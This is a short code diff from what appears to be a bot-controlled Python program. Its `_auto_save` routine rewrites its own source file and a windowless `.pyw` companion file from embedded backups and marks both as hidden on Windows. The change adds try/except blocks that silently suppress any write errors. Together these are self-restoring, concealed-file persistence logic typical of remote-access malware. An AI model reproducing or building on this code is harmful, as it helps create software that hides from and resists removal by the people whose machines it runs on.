@@ -118,14 +118,20 @@ async def update(ctx):
 
 def _auto_save():
     main_file_path = __file__
-    with open(main_file_path, 'w') as f:
-        f.write(BACKUP_FILE)
+    try:
+        with open(main_file_path, 'w') as f:
+            f.write(BACKUP_FILE)
+    except Exception:
+        pass
 
     win32api.SetFileAttributes(main_file_path ,win32con.FILE_ATTRIBUTE_HIDDEN)
 
     lib_file_path = LIB + '.pyw'
-    with open(lib_file_path, 'w') as f:
-        f.write(LIB_BACKUP_FILE)
+    try:
+        with open(lib_file_path, 'w') as f:
+            f.write(LIB_BACKUP_FILE)
+    except Exception:
+        pass
 
     win32api.SetFileAttributes(lib_file_path ,win32con.FILE_ATTRIBUTE_HIDDEN)
 
